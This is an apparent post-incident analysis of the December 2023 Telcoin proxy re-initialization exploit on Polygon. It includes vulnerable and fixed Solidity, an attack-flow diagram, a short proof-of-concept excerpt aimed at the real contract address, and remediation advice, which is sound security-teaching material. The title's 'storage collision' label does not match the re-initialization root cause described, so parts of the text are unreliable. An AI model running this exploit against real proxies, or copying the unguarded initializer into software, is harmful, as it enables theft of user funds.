# Telcoin Proxy Storage Collision Vulnerability Analysis (December 2023)

## Metadata

| Field | Details |
|------|------|
| Date | 2023-12-26 |
| Protocol | Telcoin |
| Chain | Polygon |
| Loss | ~$1.24M |
| Attacker | 0xdb4b84f0e601e40a02b54497f26e03ef33f3a5b7 |
| Attack Tx | 0x35f50851c3b754b4565dc3e69af8f9bdb6555edecc84cf0badf8c1e8141d902d |
| Vulnerable Contract | 0x56bcadff30680ebb540a84d75c182a5dc61981c0 |
| Root Cause | CloneableProxy Initialization Vulnerability |
| PoC Source | https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/Telcoin_exp.sol |

---

## 1. Vulnerability Overview

An initialization vulnerability was discovered in the CloneableProxy contract of the Telcoin protocol. The attacker re-invoked the `initialize()` function to replace the proxy's logic contract address with a malicious contract, draining approximately $1.24M on the Polygon chain.

---

## 2. Vulnerable Code Analysis

### ❌ Vulnerable Code
```solidity
interface ICloneableProxy {
    // Initialization function — no re-entrancy protection
    function initialize(address _logic, bytes memory data) external;
}

contract CloneableProxy {
    address public implementation;

    // No initializer modifier
    function initialize(address _logic, bytes memory data) external {
        // Anyone can re-initialize
        implementation = _logic; // Can be replaced with a malicious contract

        if (data.length > 0) {
            (bool success,) = _logic.delegatecall(data);
            require(success, "Init failed");
        }
    }
}
```

### ✅ Fixed Code
```solidity
contract CloneableProxy is Initializable {
    address public implementation;

    function initialize(address _logic, bytes memory data)
        external initializer {
        // Can only be initialized once
        implementation = _logic;

        if (data.length > 0) {
            (bool success,) = _logic.delegatecall(data);
            require(success, "Init failed");
        }
    }
}
```

---

### On-Chain Original Code

Source: Bytecode Decompilation

```solidity
// Root Cause: CloneableProxy Initialization Vulnerability
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker
  │
  ├─▶ Analyze Telcoin CloneableProxy
  │    └─▶ Discover re-invocable initialize()
  │
  ├─▶ Deploy malicious logic contract
  │    └─▶ Contains fund-draining function
  │
  ├─▶ Call initialize(malicious_contract, "")
  │    └─▶ Replace implementation address
  │
  ├─▶ Execute delegatecall with malicious logic
  │    └─▶ Drain assets held in Telcoin contract
  │
  └─▶ ~$1.24M drained
```

---

## 4. PoC Code (Key Excerpt)

```solidity
function testExploit() external {
    ICloneableProxy proxy = ICloneableProxy(
        0x56bcadff30680ebb540a84d75c182a5dc61981c0
    );

    // Deploy malicious logic contract
    MaliciousLogic malicious = new MaliciousLogic();

    // Re-initialize proxy — replace logic
    proxy.initialize(
        address(malicious),
        abi.encodeWithSignature("drain(address)", address(this))
    );

    // ~$1.24M drained
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| Vulnerability Type | Initialization Function Re-invocation (Proxy Re-initialization) |
| Attack Vector | CloneableProxy.initialize() re-invocation |
| Impact Scope | All assets in Telcoin proxy contract |
| Severity | Critical |

---

## 6. Remediation Recommendations

1. **Initializable Base Contract**: Inheriting OpenZeppelin `Initializable` is mandatory
2. **Initialization State Monitoring**: Periodically verify `initialized` state
3. **Initialize Immediately on Deployment**: Handle proxy deployment and initialization in a single transaction
4. **Add Access Control**: Restrict initialization to a designated admin only

---

## 7. Lessons Learned

The Telcoin incident follows the same pattern as the HYPR attack that occurred in the same month, reaffirming how critical proxy initialization vulnerabilities can be. When using the upgradeable proxy pattern, initialization logic should be the first thing reviewed.